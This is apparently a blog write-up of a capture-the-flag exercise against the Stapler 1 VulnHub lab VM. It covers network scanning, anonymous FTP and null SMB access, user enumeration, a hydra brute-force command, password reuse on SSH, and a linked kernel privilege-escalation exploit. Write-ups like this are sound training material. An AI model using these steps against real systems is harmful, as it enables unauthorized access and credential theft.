---
layout: post
title: Stapler 1
date: 2019-05-14
author: th3-3inst3in
comments: true
categories: vulnhub
tags: [ctf,vulnhub]
---

## Stapler 1 vulnhub

After configuring the Stapler VM first step is to find out its IP.We simply do that by running net discover 

```bash
root@kali$: netdisover -r 192.168.2.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                          
                                                                                                                                                                                        
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.2.1     00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                                                         
 192.168.2.2     00:50:56:ed:3a:6d      1      60  VMware, Inc.                                                                                                                         
 192.168.2.7     00:0c:29:03:c5:77      1      60  VMware, Inc.                                                                                                                         
 192.168.2.254   00:50:56:e6:7a:fe      1      60  VMware, Inc.                                                                                                                         
```

So we have our target ip **192.168.2.7**

Run dirsearch and nmap on it and meanwhile browse the site to check if you find anything interesting on the web interface.
Unfortunately there wasn't anything interesting found while browsing the site just one error page . 

Dirsearch also didn't yeild any thing worth checking.

#### Nmap results

```bash
 nmap -sV 192.168.2.7                                                                                                                                                 [20/20]
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-14 06:14 EDT                                                                                                                          
Nmap scan report for 192.168.2.7                                                                                                                                                         
Host is up (0.00032s latency).                                                                                                                                                           
Not shown: 992 filtered ports                                                                                                                                                            
PORT     STATE  SERVICE     VERSION                                                                                                                                                      
20/tcp   closed ftp-data                                                                                                                                                                 
21/tcp   open   ftp         vsftpd 2.0.8 or later                                                                                                                                        
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                                                                                                          
53/tcp   open   domain      dnsmasq 2.75                                                                                                                                                 
80/tcp   open   http        PHP cli server 5.5 or later                                                                                                                                  
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                  
666/tcp  open   doom?                                                                                                                                                                    
3306/tcp open   mysql       MySQL 5.7.12-0ubuntu1  

```

Lets start enumerating.

First I checked ftp anonymous login.

```bash

root@kali:~# ftp 192.168.2.7
Connected to 192.168.2.7.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.2.7:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (577.3049 kB/s)
ftp> exit
221 Goodbye.
root@kali:~# cat note 
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
root@kali:~# 

```

Even though the anonymous login was enable we couldn't find anything interesting except 2 names which could possibiliy be used later.

The next thing that strikes me is the netbios service lets enumerate that.For beginners use [this resource](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/).


I am going to use _smbclient_ . For the password I just pressed enter i.e a  Null login.

```bash
root@kali:~# smbclient -L 192.168.2.7
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            RED
root@kali:~# 

```

After going though all the files I only found one wordpress directory but I didn't see any wordpress running on the web server , I probably might have missed it ( I made a mental note to go back and check it) . The second reason for ignoring the wordpress directory is that there was no config file in it.

Next I ran enum4linux

```bash

..[snip]..
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

```
These are list of usernames that were enumerated I thought to use this to bruteforce login creds for ftp.

_a little cut magic_

```bash

root@kali:/tmp# cat users.txt | cut -d'\' -f2 | cut -d' ' -f 1
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

Running _hydra_

```bash
hydra -U users.txt -P users.txt -t 5 192.168.2.7 ftp

```

![hydra result]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/stapler/hydra.png)

Loging in with those creds in to the ftp I land in the home directory of the user and upon listing the files of the user I saw that there were too many files going though all of them would require alot of tile , this made me think that I am on the wrong path most likely I still went ahead and copied the name of the files and did some quick greping on it to find something like ssh or password or similar but no seed. 

After a long pause I tried the same credentials found for ftp on ssh and voila ! (sometimes thats just how ctfs are)

![ssh]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/stapler/ssh.png)

I opted for the shortest path to get root 


```bash
$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```

After searching Local explotis for the specific linux kernal and trying alot of them ( almost gave up on trying to find more exploits ) I finally came accross the following exploit.

_https://www.exploit-db.com/exploits/39772_

Ran the exploit and voila!!

![Root Shel]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/stapler/root-shell.png)